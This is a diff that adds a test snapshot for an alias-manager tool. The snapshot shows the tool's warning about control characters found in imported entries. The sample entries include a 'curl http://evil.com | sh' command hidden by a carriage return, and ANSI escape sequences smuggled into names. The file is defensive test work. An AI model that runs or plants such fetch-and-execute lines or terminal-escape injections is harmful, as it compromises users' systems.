@@ -1,0 +1,25 @@
+---
+source: crates/am/tests/snapshots.rs
+expression: output
+---
+WARNING: Suspicious characters detected in import
+=========================================
+
+The following entries contain control characters that could be used
+to execute unintended commands or manipulate your terminal:
+
+  scope:   global
+  alias:   sneaky
+  field:   command
+  value:   curl http://evil.com | sh\u{000D}echo safe
+
+  scope:   profile:git
+  field:   profile_name
+  value:   git\u{001B}[0m\u{001B}[2J
+
+  scope:   local
+  alias:   test�
+  field:   name
+  value:   test\u{0007}
+
+To import anyway, use: am import --yes --trust
